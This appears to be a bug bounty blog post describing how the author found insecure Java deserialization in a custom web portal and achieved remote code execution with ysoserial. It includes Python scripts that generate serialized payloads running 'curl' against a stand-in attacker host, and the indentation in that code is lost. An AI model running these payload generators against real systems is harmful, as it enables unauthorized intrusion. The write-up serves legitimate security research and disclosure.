# :globe_with_meridians: The Story of a RCE on a Java Web Application

---

# The Story of an RCE on a Java Web Application

It was about two months ago (November 2021) I was invited to a private program. According to their program scope, I decided to hack them for a while. This post is about a vulnerability I’ve found in this company that led to RCE.

## Reconnaissance

In this step, my recon methodology was not finding some unique subdomains or assets. I was searching for some web applications with some interesting features such as login or file upload. After a while, I came across an interesting portal.

In the following, I had to recon the portal itself for learning its functionalities. As a normal routine, I tried to use the web application as a normal user (If you don’t understand the normal flow of the application, you can’t break it). I wrote down important things and then opened Burp.

## Discovery

I was attracted to the portal because it was custom, this kind of portals, CMSes, or forums are often more vulnerable than public versions (like WordPress). While capturing the requests in Burp, I was testing the sections until I reached a page that contained a list, when I scrolled that, Java Script sent an Ajax request for loading more rows. The request was something like this:

```
[https://target.com/api/v1/list?size=25&after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==](https://target.com/api/v1/list?size=25&after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg%3D%3D)
```

The first thing I tried was decoding `after` parameter value (as you know, it’s a base64). It had a binary value but some characters decoded successfully:

As you can see, `java` was decoded, my guess was a serialized value (with some research I was pretty sure because it’s started with `rO0`).

## Deserialization

As you know, serialization is the process of translating adata structure orobject state into a format that can be stored (e.g. in a file) or transmitted over a network. The opposite operation, extracting a data structure from a series of bytes, is deserialization ([Wikipedia](https://en.wikipedia.org/wiki/Serialization)).

Some programs use serialization for storing a state and then deserialization for restoring that state (exactly like the web application we’re testing). But what happens if the program deserializes an insecure input? Here’s where Insecure Deserialization comes into play. In this vulnerability (it’s also in OWASP A8:2021), the attacker sends their malicious serialized value as the input of the vulnerable program. This often leads to privilege escalation and RCE. Insecure Deserialization happens in various programming languages but I was focused on Java.

*geeksforgeeks.com*

## The Vulnerability

As I mentioned before, after decoding the serialized value, I started researching deserialization in Java (although I was never interested in white-box stuff, I also researched the serialization functions in Java :) ). As the result of the research, I learned we can give a serialized input in different formats, for example:

```
Hex signature -> AC ED 00 05Base64 signature -> rO0
```

The target is using base64, so we have to find a way for creating our malicious serialized input for RCE but before that, we should make sure the target is vulnerable. Here I had two ways: 1. Writing a PoC code in Java (I didn’t know Java ) 2. Using available PoC codes in public. I was pretty sure the second way was much better for me (although I didn’t want to be a script-kiddie). So I started searching for some PoC codes in GitHub and found [ysoserial](https://github.com/frohoff/ysoserial). This tool generates various payloads according to the functions or versions, one of these payloads is *URLDNS*, you can give it a URL and it generates a payload. The program is vulnerable if we give that the generated payload and get a DNS query from the server. In other words, I had to do an out-of-band test to make sure the application is vulnerable. I generated the payload and gave it to the web application and … :

I got some DNS queries and the target is vulnerable. Let’s exploit it.

## Exploit

I was sure I could exploit it but there was a problem. I used ysoserial again but I was shocked because it didn’t work (At least I didn’t find any suitable payload). I gave up and started hunting for other bugs on the portal.

## Get LIL NIX’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

After 2–3 weeks, I decided to work on it again. Like before, I had to ways: 1. Writing an exploit code for RCE in Java 2. Finding an exploit code in GitHub (or anywhere). I chose the second way (there’s often an exploit code). This time I found some ysoserial forks with some additional payloads/options. I couldn’t test these payloads manual (they were too much). So I wrote a python script to generate all the possible payloads and save them in a file. Then I gave that file to Burp Intruder but again, didn’t work. The final version of the script was something like this:

```
import os

modes = [] # All payload names here

collab = "attacker.com"
payload = f"curl -s https://rce.{collab}/poc"

for i in range(0,6):

for mode in modes:
result = os.popen('java -jar ysoserial' + f"{i}" + '.jar ' + mode + ' "' + payload + '" | base64 -w 0').read()

if result != "":
print(result)
else:
print("Donno but something is going wrong :/")
```

## The Second Try

When I didn’t get any request from the target, I kind of gave up but I took a look at the responses. Some status codes were 400 or some other responses contained a Java error. With some troubleshooting, I noticed some characters in base64 break the request (e.g. `+`). So I had to modify my python script and URL encode the payloads before saving them. For the second time, I gave the new wordlist to my Burp Intruder and after a few seconds:

This means I was able to execute my commands on the server (RCE). After finding the correct payload and the correct ysoserial fork, I wrote an exploit code in Python for easier reproducing:

```
import os
import urllib.parse

mode = "THAT_FOUNDED_SUITABLE_MODE"

collab = input("Enter your collaborator domain (e.g. attacker.com)> ")
payload = f"curl -s https://{collab}/poc"

result = os.popen('java -jar ysoserial4.jar ' + mode + ' "' + payload + '" | base64 -w0').read()

encoded = urllib.parse.quote_plus(result)

if encoded != "":
print("Copy the following payload:\n\n")
print(encoded)
else:
print("Donno but something is going wrong :/")
```

Finally, I created `/tmp/poc.txt` and reported the vulnerability. For PoC, this would be enough.

## Lessons Learned

- Always decode any base64 or other encoded texts.

- Public tools are good but if I wrote my own exploit code in Java, I would find this vulnerability much faster.

- Always test every functionality, sometimes, you have to scroll the page :)

- Sometimes, we have to do those boring works too.

- By default, Burp Intruder encodes the given payloads. But this feature was off in my Burp, although I solved that in my Python script, I figured out that feature was a better solution.

## Resources

---
